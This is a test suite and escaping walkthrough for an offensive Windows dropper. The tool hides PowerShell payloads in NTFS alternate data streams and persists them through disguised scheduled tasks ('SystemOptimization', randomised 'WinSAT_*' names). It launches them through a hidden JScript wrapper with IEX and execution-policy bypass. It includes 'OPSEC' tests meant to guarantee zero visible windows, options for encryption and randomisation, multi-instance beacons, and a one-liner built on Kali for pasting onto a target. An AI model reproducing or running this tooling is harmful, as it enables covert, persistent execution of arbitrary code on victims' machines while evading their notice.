########################################################################
#
# JScript Wrapper — Escaping Proof & Test Suite
#
########################################################################


# =====================================================================
# PART 1: ESCAPING TRACE (ADS-Dropper.ps1 — Build-JScriptWrapper)
#
# This traces what happens at each layer for the UNENCRYPTED case
# with a concrete path to prove the escaping is correct.
# =====================================================================

<#
INPUT:  Build-JScriptWrapper -ADSFullPath "C:\ProgramData\SystemCache.dat:payload"

STEP 1 — -replace '\\', '\\'
  Input string:   C:\ProgramData\SystemCache.dat:payload
  Regex pattern:  \\   (matches literal \)
  Replacement:    \\   (.NET: \ is NOT special in replacements, so \\ = literal \\)
  Result:         C:\\ProgramData\\SystemCache.dat:payload

STEP 2 — Template substitution (.Replace)
  Template:
    var cmd = "powershell.exe ... -Command \"" +
        "IEX(Get-Content '__ADSPATH__' -Raw)" +
        "\"";
  After .Replace('__ADSPATH__', 'C:\\ProgramData\\SystemCache.dat:payload'):
    var cmd = "powershell.exe ... -Command \"" +
        "IEX(Get-Content 'C:\\ProgramData\\SystemCache.dat:payload' -Raw)" +
        "\"";

STEP 3 — JScript string evaluation
  JScript sees:  \"  =>  literal "
                  \\  =>  literal \
  So the cmd variable in memory =
    powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(Get-Content 'C:\ProgramData\SystemCache.dat:payload' -Raw)"

STEP 4 — shell.Run(cmd, 0, false)
  wscript passes this entire string to CreateProcess.
  PowerShell receives:
    -Command "IEX(Get-Content 'C:\ProgramData\SystemCache.dat:payload' -Raw)"
  PowerShell reads the ADS and executes.  Correct. ✓

WINDOW VISIBILITY:
  - wscript.exe //B:  no script-host window       ✓
  - shell.Run(cmd, 0, false):  SW_HIDE on child   ✓
  - PowerShell -WindowStyle Hidden:  belt+suspenders ✓
  Total visible windows: 0
#>


# =====================================================================
# PART 2: ESCAPING TRACE (ADS-OneLiner.ps1 — Build-DeployBlock)
#
# The OneLiner has FOUR escaping layers.  This traces the unencrypted
# case through all of them.
# =====================================================================

<#
LAYER 1 — OneLiner generator (Linux PowerShell)
  The outer @"..."@ processes backtick escapes.

  Source in Build-DeployBlock:
    `$_jsBody=@'
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = "powershell.exe ... -Command \"" +
        "IEX(Get-Content '__ADSPATH__' -Raw)" +
        "\"";
    shell.Run(cmd, 0, false);
    '@
    `$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
    `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
    `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
    `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""

  After @"..."@ expansion (every `$ → $, every `` → `):
    $_jsBody=@'
    ...JScript content ($ signs literal because backtick was consumed)...
    '@
    $_jsBody=$_jsBody.Replace('__ADSPATH__',($adsPath-replace'\\','\\'))
    $_jsPath=Join-Path $_jsDir ("windiag_$(Get-Random).js")
    $_jsBody|Out-File -FilePath $_jsPath -Encoding ASCII -Force
    $a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript `"$_jsPath`""

  Note the -Argument line:  ```" → `"  (backtick-backtick = literal backtick, then ")
  In PowerShell: -Argument "//B //E:JScript `"$_jsPath`""
  The `" inside a double-quoted string = literal ".
  So -Argument resolves to:  //B //E:JScript "C:\ProgramData\windiag_12345.js"  ✓

LAYER 2 — Generated PowerShell on Windows target
  The @'...'@ is a literal here-string, so all $ in the JScript body
  are stored verbatim in $_jsBody.  Then:

  $_jsBody.Replace('__ADSPATH__', ($adsPath -replace '\\', '\\'))

  If $adsPath = "C:\ProgramData\SystemCache.dat:payload":
    -replace '\\', '\\'  →  "C:\\ProgramData\\SystemCache.dat:payload"
  .Replace swaps __ADSPATH__  →  C:\\ProgramData\\SystemCache.dat:payload

  $_jsBody written to windiag_12345.js with -Encoding ASCII.

LAYER 3 — JScript on disk (identical to ADS-Dropper trace above)
  JScript evaluates \\ → \ in strings.
  cmd variable = powershell.exe ... -Command "IEX(Get-Content 'C:\ProgramData\SystemCache.dat:payload' -Raw)"

LAYER 4 — PowerShell -Command
  Reads ADS, executes payload.  ✓
#>


# =====================================================================
# PART 3: TEST COMMANDS
# =====================================================================

<#
Run these on a Windows VM after patching both scripts.

TEST 1 — Basic unencrypted (ADS-Dropper direct)
-------------------------------------------------
.\ADS-Dropper.ps1 -Payload "Write-Host 'STEALTH OK' -ForegroundColor Green" -Persist task

Verify:
  # Task action should be wscript.exe, NOT powershell.exe
  $task = Get-ScheduledTask -TaskName "SystemOptimization"
  $task.Actions | Format-List Execute, Arguments
  # Expected:
  #   Execute   : wscript.exe
  #   Arguments : //B //E:JScript "C:\ProgramData\syshealth_check.js"

  # JScript file should exist and be readable
  Get-Content "C:\ProgramData\syshealth_check.js"
  # Expected: starts with "var shell = new ActiveXObject..."

  # Trigger — watch the taskbar, NO window should flash
  Start-ScheduledTask -TaskName "SystemOptimization"


TEST 2 — Encrypted (ADS-Dropper direct)
-----------------------------------------
.\ADS-Dropper.ps1 -Payload "Write-Host 'ENCRYPTED OK' -ForegroundColor Cyan" -Persist task -Encrypt

Verify:
  $js = Get-Content "C:\ProgramData\syshealth_check.js" -Raw
  $js -match 'Get-HostKey'   # True
  $js -match 'Dec\('         # True
  $js -match '__ADSPATH__'   # False (placeholder was replaced)

  Start-ScheduledTask -TaskName "SystemOptimization"
  # No window.  Check if payload output appears (may need to check
  # a transcript or beacon.log depending on what the payload does).


TEST 3 — Randomized + encrypted
---------------------------------
.\ADS-Dropper.ps1 -Payload "Write-Host 'RANDOM'" -Persist task -Encrypt -Randomize

Verify:
  # Task name and JScript filename should both be randomized
  Get-ScheduledTask | Where-Object { $_.TaskName -like 'WinSAT_*' } |
    Select-Object TaskName, @{N='Action';E={$_.Actions.Execute}},
                             @{N='Args';E={$_.Actions.Arguments}}
  # Expected: Execute = wscript.exe, Args includes a random .js filename

  # Find the JScript file
  Get-ChildItem $env:ProgramData -Filter "*.js" -Recurse | Select FullName


TEST 4 — Multi-payload OPSEC test (CRITICAL)
----------------------------------------------
  Deploy 5 separate payloads:

1..5 | ForEach-Object {
    .\ADS-Dropper.ps1 `
        -Payload "Write-Output 'Beacon $_' >> C:\beacon_$_.log" `
        -Persist task -Randomize
}

  Trigger all simultaneously:
Get-ScheduledTask | Where-Object { $_.TaskName -like 'WinSAT_*' } |
    Start-ScheduledTask

  EXPECTED: Zero visible windows.  (Old version showed 5 flashes.)
  Confirm logs:
dir C:\beacon_*.log


TEST 5 — OneLiner unencrypted
-------------------------------
  On Kali/Linux:
pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'OneLiner Stealth'" -Persist task -OutputFile test.txt

  Copy OPTION 1 (Base64) to Windows VM PowerShell.
  Execute.

  Verify:
  Get-ScheduledTask | Where-Object { $_.Actions.Execute -eq 'wscript.exe' }
  Get-ChildItem $env:ProgramData -Filter "windiag_*.js"
  Start-ScheduledTask -TaskName <taskname>
  # No window.


TEST 6 — OneLiner encrypted + randomized
-------------------------------------------
  On Kali/Linux:
pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Enc OneLiner'" -Persist task -Encrypt -Randomize -OutputFile test_enc.txt

  Copy OPTION 1 to Windows VM.
  Execute.
  Trigger the created task.
  Verify: no window, payload decrypts and executes.


TEST 7 — OneLiner multi-instance
----------------------------------
  On Kali/Linux:
pwsh ADS-OneLiner.ps1 -Payload "'alive'|Out-File C:\multi.log -Append" `
    -Persist task -InstanceCount 5 -OutputFile multi.txt

  Copy OPTION 1 to Windows VM.
  Execute.
  Verify 5 tasks created, 5 JScript files, zero windows on trigger.


TEST 8 — Cleanup verification
-------------------------------
  After any of the above tests, verify cleanup works:

  # From manifest or manual enumeration
  $taskName = "SystemOptimization"   # or WinSAT_XXXXXX
  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

  # Remove JScript
  Get-ChildItem $env:ProgramData -Filter "*.js" | Remove-Item -Force
  # Or for OneLiner pattern:
  Get-ChildItem $env:ProgramData -Filter "windiag_*.js" | Remove-Item -Force

  # Remove ADS host file
  Remove-Item "C:\ProgramData\SystemCache.dat" -Force
  # Or for randomized: check manifest for path
#>


# =====================================================================
# PART 4: QUICK DIAGNOSTIC (paste into Windows PowerShell)
#
# After deploying, run this to confirm the JScript approach is active.
# =====================================================================

<#
Write-Host "`n--- JScript Wrapper Diagnostic ---" -ForegroundColor Cyan

# List all tasks using wscript.exe
$wsTasks = Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -match 'wscript'
}
Write-Host "Tasks using wscript.exe: $($wsTasks.Count)" -ForegroundColor Yellow
$wsTasks | ForEach-Object {
    Write-Host "  Task: $($_.TaskName)" -ForegroundColor White
    Write-Host "  Action: $($_.Actions.Execute) $($_.Actions.Arguments)" -ForegroundColor Gray
}

# List JScript files in ProgramData
$jsFiles = Get-ChildItem $env:ProgramData -Filter "*.js" -ErrorAction SilentlyContinue
Write-Host "`nJScript files in ProgramData: $($jsFiles.Count)" -ForegroundColor Yellow
$jsFiles | ForEach-Object {
    Write-Host "  $($_.FullName) ($($_.Length) bytes)" -ForegroundColor Gray
}

# Spot-check: verify a JScript file contains the wrapper pattern
if ($jsFiles) {
    $sample = Get-Content $jsFiles[0].FullName -Raw
    $hasWrapper = $sample -match 'shell\.Run\(cmd,\s*0'
    Write-Host "`nWrapper pattern in $($jsFiles[0].Name): $hasWrapper" -ForegroundColor $(if($hasWrapper){'Green'}else{'Red'})
}

Write-Host "`n--- End Diagnostic ---`n" -ForegroundColor Cyan
#>
